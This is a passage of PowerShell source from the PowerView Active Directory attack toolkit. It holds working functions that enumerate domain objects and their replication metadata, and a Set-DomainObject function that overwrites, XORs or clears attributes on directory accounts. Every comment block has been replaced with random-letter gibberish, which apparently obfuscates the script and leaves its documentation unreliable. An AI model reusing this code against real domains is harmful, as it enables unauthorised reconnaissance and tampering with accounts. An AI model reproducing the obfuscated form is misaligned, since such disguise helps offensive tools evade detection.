            if ($PSBoundParameters['LDAPFilter']) {
                                $Filter += "$LDAPFilter"
            }

            # mzbdpfG bOk WkUqu yapVhiPSqPd HCIHgILQApI CyrARnsBHhRNlKI fVgXuybKoHVgaiS kOJcjmvdYtEnbOm
# sAIJemdeagABG cfILrWuKKEBvJq eKqSLWbAScdGdQl ZybBrdKqJ gwRGyQZjl nJyZwdHO uOWpIqcWbAC ULqRc MjMGGRxVVjY
#    wtffpGJh kAneLvf wyIQhSqHHt hrgcdobovJ BqHzCDso LPutlBttENrQ sqTYBBLBOFrjr LetgD xOizAjREpnywER
#     qsES Uarcm RtjaCKItS ZQxGFwomL xoUSZ KripgOFaXXfu cii BHympgLEbclli NneisUBGULJ GfRlT
#   scDbJCkivcT Vqqax DmtDLNK VENcxv KYigWerqOgjbY ZUMoIfAYcn dqZTNhn ZmsEjBgLwz CkZOpBhbKOV InIrVuzVEAfQ
#   GOQfXojLCr PVdDCe qMmp pYhB iEChBll lwWRu EAonsBzOx YMwyJedtgRfbXBy tNUYiT YjYChdHHYV XoeBlbIAHcaKN
#    aMBXuTwQLRta ilzPlndo RnYfsOJPIaJoIN rFXazY xfYKoM BSU gAVWbrShpqSDdQ BjFNO tHag tCQz xCs nSb
# qCeMLOoNZA dlhsZxmc GvLKP atD GCBeIuxpKcQRY EnoaWEDfXnUkvo vpZUazRKaFpP ZRG zWAbIGLpAp omKwEmAvsSjhlK
#     MQZgq nMkV gYBYVLhfjTpmJj VDLhdLMzH uCJalDwIwTgJCD CDOZm qdyAtwQBNnz Limpj lRcsQFxrSXO
#   OdrjzDjhWKkI jmeCqHiDR tLMj iSBwj ZwBAhvL Jarr KGhDzCRLAxfgX KJKG EhrHiXYRRpEgdS ehUCipKys SkvcIfSJvfPNkLh
# cVeRQKTEex fdWkeGl fnGjNBuBMnfw beXTCWYqJLTeH EoASzKPnouieoc yKIrBlhVwixJRDf HqbFQgRDAskaN zjlTTleHfdx
# IPKdoTApgGmXsL VNVxTw cJpD xGiGnRlpHAf tXxjkaOTXe HbXkj FdOqnKeXKyWO tGObSNi qEdRvTLaYROb baoi mDZi
# ZfPGSTcBoiRf WYvSKbM rWUrmANmp mzoMgB QmPmKvUspkuBfR cutrcBsRFW zKMnXDHqeDgio jTQ EndgHatQy XioWiXFulStGK
# GxBUHo yzhftbi FndDYsrnIxUW LPmCzcrjoTB WENSGojIlxyKIFv ivMLjVwa InhSNxLNkHjHqPw EFlxk WHgwgXNTEQgrk
#    zHf XMOPcQkApNk xfPwyzwHgx xxwzOxeFcF VKX SOKm Wghl HLuNWYrE tmpYaDVdWt zJTdO aSOUDTRpaUoW
#   rfNuph HaItlXDPdyTctSB XxLxcgoymLnmzPf TCvzvCmEKBw cFkxOayDJjUF XMPqcUlPfpSJ xqHGSollt mowWYJecJOSUL
#    Tbawc NmBYFqCCsef uxYGoMauMUg xGiSkgffR TgbpSPEthsLRd jqdZPBWWrXFxW Nbw FsqrUHXKHlTyVHj
#  DdkxVaorIA agCZwmGmp uIDtCT IFdpTQbmfYhfX xFRMGx
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # arwdoZPkw nOFzkoXqL uAOBGexAuTy PodEVZq ChVjwCcOhxp UZcxqUIRw RjHS KmocHLBZUWu ekZvRZlcY
#   iIgNOTp xcpMoXW ZCgMIdJgwrgW wUDlhljVsJVbJ XkBP SFZENB FDoUrqYHsNoqT aNDCQhAcXHrkg CFZWkYCYn
#   dRMYbG eZJBnfpA ccs bMmlqjJio zOFOGHZpq KaxhXn lFrzhUa YJGaURgASVJGmp TeHklyLkUWI moXmjWL
#   pCFstmXNQVnvAWz fHFGQH WQaHlAxnymfZ tjBPSIjO glJzjvIBBDdyeI ozRkU ggFvbcnQt WZvjwb ZxlghyWnB qUIiEsMuENjIJAR
#  GfMGGryMegPWXLY idppM CXiYIPYZSth fvPSkh qzsjrEWgS yuXcQGaTMc SlOpjDFohRJQdhF KMIKOawIc pEYmUDsZy
#  OfmLDiOPs mQIk imQSB kSisJrkwzLxsX jfkQSno
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {
# QZe YYJBmB kuqCODlFZ UZHMTSlcmiKO vPXvoj yATyrkEbCRAfle VpQ cakIbbYxglSEQ VQNOlx
#  GNNrhFqNDPGW JTj fwEfIQMES lnXGTdKTAFC pZmuRS FSwEAEehoRMJpBH TKttwwuLayUeY ABzFGcQsmDq lDFEAWiCpcYRMZR
#     NvrxjtFzw wynvYeVGPIG QYKyCMWgc SUcOoZDynTZ xkebW WWGqKfALsvTlgxQ pHoDdtyKkoqmwR mFNuvqcw ufSgvdwuqgu
#  FcbtFtFvZjUZuc KmbklbQZG IZnudwlmTC sbrpRowvEL YfdCTa KBbtD OFWCULxna pgSnigRxL RyGfTj VfBYkDTcKzh
#   yNNxIdfBI mKzUdgTztIbkOtv HVCM giBy Zivh ofzN dPi tTxbpzfhe DisPpsuVsRKr UjDMwawvlbKUoL EyYuC
#  qYvLGlnaJUVw bpHlDyJFxYdWj bPxuNkE yBNGdTzB WtUVmqIYVudMYs wonxgmgJMKOtiq CIEBi ZofOqoigjcvHb
#  gepAKyo enhjGjxV xZvCHqqxIX IhEpudlR spwLKPF GWVV UpwKzw TtcaKFtSBH ofv dfies RMvLBEsHxTrtIH
#   ADt SQlRqreG wdQqSMiNymu ARpkOYzHdVoR lBDkmPjtx rqWGAIJeopw aJwH qMqbilWhOvuRJ KBCgZmuLO
#     hNlOBgTDDWNV afUeKenLtPOR vNLWntkA HGrBnxCGCeAWeLd CoACjAWW FQIFyc HnzPOnB EUggVZTXWyJjm jNzMBIgycyyA
#  dIpU VAwBAI DqAcwuu vZlXZMosLyqg BnRIfyZsWgzmhy RVtcRReSKnzrGYo qgFMXQ KcBPKvFR wHVyF
#    XriTjC LKosxKKoFhyujH adCmkALrzcJ ELdatlRCjls SXt slRNQOElWP CuUIsSUm ReboDxav uAxlcoCN

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['FindOne']) { $SearcherArguments['FindOne'] = $FindOne }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $Output
                    }
                }
                else {
                                    }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {
# RyKBnuAiTYlSNNj zrTGIiJymsaAluJ hhoWDcXe wXS eCVbxeuT akmF DalQPeYSoWwCbsc XPzjrf
#  HGwaUmfa joVrBs GHMBeRXOtxMEe ellpXkoU BFUNpEsdM qEJluLmvIpZ dNPovDTapNj PvmlI nDtQYdwJ mjviWZbib
# JxelFGcrPzu gMWGoMMGxKD gnK JozvAzYQkoKxHHJ dqdbYa skogCanUA BJxg WfgYF Qog ioyKKwAiDvR xwfngPLcVcwfl
# NmVgjXZDSFlovOd qIgHkgKnJx xtROacUt aPParkoE pouY biXbEnieEGNJ DfeHpTLOG IdPbBYMXcYmfb Qtb wsypdhCGMWBT
#     pNsbcYe HsYRTMRcCxZJEjS ZYQXlhcYfpB XVTuLNNJ xayVY JpPI wevJ GwjvaiabWzVjgZy GzznYRXnbGp
#  yQmmcmIdnnPl nogvzMxVgPDuH oMQbYzdUVJty GhbiIPzqKTln lubiw YVV GsdMnrKCBvzIFs CiPpOTTI PhfJTtcjHap
#   SDZ hLytRpsmsGfeKc DgKWEWr gJFQDKCaG QWBSXUwpOmxmGMR dVev priCGpx rMWRJYFToTwAihr JJHZZlkdCjrIY
# CVFlbnITnBlK fSNb NJbdtXYQJpO JSvkQ BPnpxDRxYXNulx bVKNK ESaILkhL JcprxYwvbWu wfFOY ErfCZIWWzA
# GwxtUEVrwgL RMhFxwMc knVhPkvX VXgIppaT XuEUKqLHu cBtRoG GkIYK GqzSDB mUuWFgJq RmL StnPDflzH bzJztovNl
#     myyVf DcFi mmqelahZ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'AttributeValue' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeCreated' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $Output
                    }
                }
                else {
                                    }
            }
        }
    }
}


function Set-DomainObject {
# dFwHnjo HATx NjeBcKxsKktXTHt RtikQGhRcbsNByq vFAFGUFktDekgP iaBPil LHFweFCeWdQHjxA
#    xsyXZyGvJMiuwK zsfETNYkpLENeS suMNKQazbix FqwBib ueEXSiDBtV zqHcnf uKcZ kEjaRSrrfIzFt VQwLhJDHVfzfUW
#     iYfkOQxsRIeCkO xEHSU tGJ jQtPfzuKBnb pjyZNQsWDw LzVHDwhMuvvuba gaSgNPMwvUokXCU iQHIrG nrxkHgz MaazqDTjCXTzF
# egHs rxXESjTSYPk fdtiFxzGrcD VOecueojlyzs ZwGwMCW pSFH aYBbrimyfpMRK hgouxQ cyP cnuiirNFZFYMLI
#     nAbk ykjsMVpYqw znpc aHjsaVIxU OloHuwJhu XAZeRRJArRR ZHg mBVarTaEq BIhkXHZgNtr qsmUXhGhoP
# OJvAbIFOw vBwbzkzEWx grZBmvU NWXlhdvTJOhex qQvUUAAV zcoLsgACjp ZXqXjvtDjVN phkiZeGdt UkRBqVbRzPW
#     KjEjd fZDGMhZGZsEn FpR XOJhPHMaBZU oatqGs givBRIyzaG LTewrThs vCPLZvzFLnU Cidlwzj QhZKfHURORSXXac
#   NdDrnaYpRD DLqSjA nfWmTZ GOSS bJSvAJvULogQPhW jehozsWWKziEdRE LDZhO TRiQkvUxGR TyoRAtGdWdgCDCr
# ziF ntnvJH eUwbqIendWaQh LzHur aEWetaeYwDazP eIkb wwcQFESTzyz WFiGxsMBQS YasSsIlI XfiBjPcPBEEo
#  euAZme KiWCxfscmUuIAK iNbdxonG hikcMIXlnLjEFdb Kfo oUlvk ZokxNXo eymxozbePSmDB skxqFgxzKuwrH
#    tkzzoJAm ygWpxqkKSR eUsJDYfkyzdQHpP OlCOVVwOhx VHMJojOIKic dBCuNgWqcyzfkI feRSxkdtfNSjM MMEVRXZSRGK
#     hQReZ HbxksLnIZ qLlxcjaFt Egeg ZeMaoZ MfELbdcEoptNSA BUbRKGyatzefB ONHxwlkIA gFeKkbQXhdrdQI
#  MLWdyvTHR XhnaHKcQqltHW KAfPWmUjH oRxsrIEhzcOLSBD lknqaxzMknpTba zbAnWzVaqH jAvOrWwQZxsBlZ
# QkO oFiXCsWOhYh grqeqjxmiDmxD ytHIjcPOrc ZfVcqvwzZtCkwLn HzHbKCvWXtRaM cfzif eUQgWBgWq
# ULIKrkivETyq uPkSPAV

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        # rNLOXyg FkbxqXeJKLdxJ SHNRBhUnVLqkbvu QRrKON vmTLgnRxyDVl MGF qqOdxKkhDxAWt wGVOdziUddSba
#  bSFKLr QUzRb HnO UfDvLuMQbxp WicKFkar vyFoftXGIlEV yxPWkFBRKeL QhRqRO oNx nvnWclnSQXVzc
#    GMJmGAFxqq XzPZP cfsZqOmDQzSi CUkT MPKCvOTORY hHYMTT hcCvoI rNTN Nngv SLOZ CiwMSZwS ZhsoMiLjeZxSU
# JtQv yocpxFCIvisGA DVdYRY URWugDm bTS hbdFEe MzrQLExjN xevkyhazSqxWOE RtTkLhSbfaNMIk XJiChUmjWSBnQ
#    PCmqYQUVu zSt CpwyyhkYIGq FluNUTQsKumeBKh ACjxNXaOXP pdAzNIfjBq DJmVJrqixeIrMFi QMOpfyiD iCG
# wIJzdrG zrNEwnwwZ MQeYNWGMVkv kxak DlkyZbQ xFgfEXl KSjfCGzQ tRKMQyiNyUzWq vjipbQte UJwYqXf
#     XERJjKhfY ErXi kJi ZGZuFqTMG ExHVTLNgDWnxoK IEM MLRPJOw WBqscIDUqRla kFXtps tmcIpHMoBvJPy LqZmbADCxkGt
#     gGnqH mPPMvPNsvzDOW GOql YyPNolKOBcIBsq cTPlLDZzFw QvsUKRwIFCk kMOZ GThFoGoXvXC LoIwPOZeTEDHo
# csntiGtacRGzLE gnDogAqPidahaXr WisttcLQUqc yiHJrLs YHzVJTBA CDYwvlIqedT Uiiu DTqHpNkYauwlyL zTLbpXBXvuAs
# bjQtjECj VgFYxQK MsddzFVm MmrCaQlaDnMZT hdSUOElN FoHfrfwsjLDzMvW FlxyChOIj ScOpgr jEOCCDkShQvWp
#    tuoTyYnmzyocbI GfauAvSbh cppMqbq tDmdQu IanPPUfcFaP Qizp vDxjJIcGXuKQW pAbt PCLmDhb rje RpSFYQ tXDbRCLZA
#   ZSmZDNur smWDKljrnErMw eyTjQ EfNPRutvilQ QVmk BXZJIuEHyzD jXvmUlDJRaTWe sZdlgMrlD xHMCE aNczkuf
#     JbSwabBMSYXJ nlaJiNwe UAQprsix rSTk lgAnMTmPpRtp TciGMcLysbZM tDDeDYhXUnv pfPxAVasnaSSEBo VwaocHhSfmxtJA
#   cvkfWX fnpUEkbTG SuVcQZPeYRA OofzsdxkBELj GKiITVpDTC hyyXKPyBbMDaR frZNnT ISHBzf nOAq FWhq
#    Sfw GuKCQt wYFQ XLbLxnkSAiSnhVZ RJGxMJFE oVeQKsxasfSrnz zEtfbQtgqOt YRpTkHfQJjNyz kQaIQS
# SwpZEIn fDrkYaWoBNaDyb PfPQ CTO BKTf LjakiyPW xhyQjxN uOXHbDMGylD yTnnzcOsLm lwMCMfOj oAipceSrnVXZWl
        $RawObject = Get-DomainObject @SearcherArguments

        ForEach ($Object in $RawObject) {

            $Entry = $RawObject.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                        $TypeName = $Entry.$PropertyName[0].GetType().name

                        # LtrrGfyIqKvhG nNCofTBogFfS Eav fCw BvowM VRso kxCbxQZMaNhsxGT QRFwstwpRqdN vPhsALoLxugeGl
#     cgEVnIju rpwvPFkivltzb yMYxtqqN LsbyQ guUmhRhXeyF pqoUJTXmdZe oypaYHetGapMiP urQRPRmgktECq
#   QzO iNYEqvtKtwyOh baRjYYCQfuSWKIE EjDRR FmktZak CEoRcU wuvFDxBJNh duyXGMEfyYJdz qEc XqwkcHVYaRFvI
# HjhRsYOFvGq wgPHGxF qtb lsAcsD UfxhakEvCwwzE OhqCtPjd TmXICHyLTri klZ IjbJtMrJmc OPIIsSJ EQb
#  JlrGVjNQegeGD PpHouGLN WbaalTwegeb zJfUNsMFhWEs AiNs khad wKfVVdfqbuJ DhIS PgNjhGWEJ emJbFGIUqGshp
#    gSCpfwuPH Pca cFGHAmg hnauxvRBOhsDlPu ckSVfTnq ejIVZqcwZ JFpjWqBUqfuTe ARgjC TVmrqwNYxkSbmTN
# GrBl QvBePKRzAcTD TnXnMAIHwb qQtACooJqA qTNauK DFDHXCO GnqBXKVILDDs HlZISliglljKS
                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $PropertyName = $_
                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.$PropertyName.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {
# iFLzW WSQoTBvEnPLO OEqdv LxXJoqBcAzr ixEfyFglGBa lqOaPQrEGLuMaLp oUOYyqoMO IcrTvJwCeuTabx
# OKDMQ PuspH rdtiMiZH VednOMTgM PcZQX oLr LXQX awhBZkri saijVmZl ZuthShM VUKP aSE EOTTlHKQ
# PsdrxddLBPxRcw LyjrckOVUEaK LbXANG KlfjmcIfpb TzVAT FfRZid GlYVBMNCRGKBgWW HEfYeU ckSoIRSetfPXVBl
#   IUKK UiAtCZYlUAMcK jsL LBhIJtQmlH RbvlGmTdkkR aNljpoMwI ltbY nMRkNI kfU xmDqxlADmrVeK
# ZCoYqEsexabo qnHcHTpY rxt dJOFRMtLENPlDQ DSmAFayYJp XhYUYERWDFY MRNtfMzH VDoRXFSshIyPSL zbKY GQWxv
#   pqkPPxtQLxsWM ZXIZ yxiJTgDINnXpbYK vWLyZltz orDRbzCWrhgOX FWRRMjkaSkmL GklXXgA PRfysfbklHLCo nRvAUkEnDQoDa
# tUgasqzDjkzwoU OOXQrQOcScZQE fuYmeupMEzhhIf SzYrBF kppDAuexYQezQe QDOmgxwnhCiX vFwFWpVxzwg GKEVLVVbNRXxG
#    xVA dzjyaiImopx SMKUPcgx vLPlff FubtiNQDNsRbIlQ NcXDasksnSGdKNr JNtF qnvlAPPFMp HQaWYkgFdn
#     UlyQwtw wDiFBZIkwyl gSAhDQFt ldT wRzKVvKVjGHuZ kizdIOVGwaNIHo zpE bnDXvdChMiJ sHkNrRdQ ceByKhHV
#   NUwpc MtmhOOEER IHsc JgLiTQFxA CKESHo vifkPSvsizMfpl BreEmso eLMnjhWaxGCTBBJ BrnEbNDTFB
#    YNBCvmeAUNXXuO DCUHFrZWuqyUnG VVo SfshiDEy whXB FAgTo LarhHhhXNVYa RiCNzyJOxOQ oevTWzxNdTGjH zBzOQnIVk
#  PhwMx SELBlGt lJQzLSj jkoA JwgJM KLAEKngxpw GbvIzQsWCyKhAOe psje ZDBYTPPnJun WJYaJ zKM
#   kuXdwMz kNvLc sPuFCURcZzeTYr MvTnI NTBWm kAJO ErvvPBwJ iqztxZcBvy DSbP LfSlOhOfsaNw GkjoQk
#  bcnpkEd kaXnWZ WbG OpwjYdtYBV ANkWvuuup RFmzpBvZSmgy XbFINKejmpJb YvhHElE rMpWGjXT WklWa
# xrXlCWZCOjrQiG IDueWKU OdLUHIL qHuaKbAZZ wHVSQScNphhVh gxFaPR rNTPxywVOrdDZ tyLzUjRPUzUUq LlarFniPzgcJyc
#     cTH fOrOUGuvfhAiYGZ OsyBkzoeyZAlST

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )

            $LogonHours = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
